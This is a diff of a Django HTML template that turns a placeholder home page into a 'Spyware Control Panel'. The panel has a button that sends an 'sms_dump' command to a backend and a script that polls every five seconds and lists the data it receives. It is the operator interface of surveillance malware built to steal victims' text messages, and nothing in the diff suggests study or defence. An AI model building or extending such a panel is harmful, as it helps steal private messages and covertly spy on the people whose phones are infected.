@@ -1,23 +1,42 @@
 {% extends "base.html" %}
 {% load static %}
+{% block head %}
+<script>
+    function sendCommand(command) {
+        fetch('/fetch_commands/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ command: command }),
+        }).then(response => response.json())
+        .then(data => {
+            console.log('Command sent:', data);
+        });
+    }
+
+    function fetchData() {
+        fetch('/receive_data/').then(response => response.json()).then(data => {
+            const dataList = document.getElementById('dataList');
+            dataList.innerHTML = '';
+            data.forEach(item => {
+                const li = document.createElement('li');
+                li.textContent = item;
+                dataList.appendChild(li);
+            });
+        });
+    }
+</script>
+{% endblock head %}
 {% block title %}Home{% endblock title %}
 {% block content %}
 <p>Home Page Working</p>
-<div id="data-container"></div>
-
+<h1>Spyware Control Panel</h1>
+    <button onclick="sendCommand('sms_dump')">SMS Dump</button>
+    <h2>Data Received:</h2>
+    <ul id="dataList"></ul>
     <script>
-        async function fetchData() {
-            try {
-                const response = await fetch('http://your-server-ip:3000/api/data');
-                const data = await response.json();
-                const container = document.getElementById('data-container');
-                container.innerHTML = data.map(item => `<p>${item.dataField}</p>`).join('');
-            } catch (error) {
-                console.error('Error fetching data:', error);
-            }
-        }
-
-        fetchData();
+        setInterval(fetchData, 5000); // Fetch data every 5 seconds
     </script>
 
 {% endblock content %}
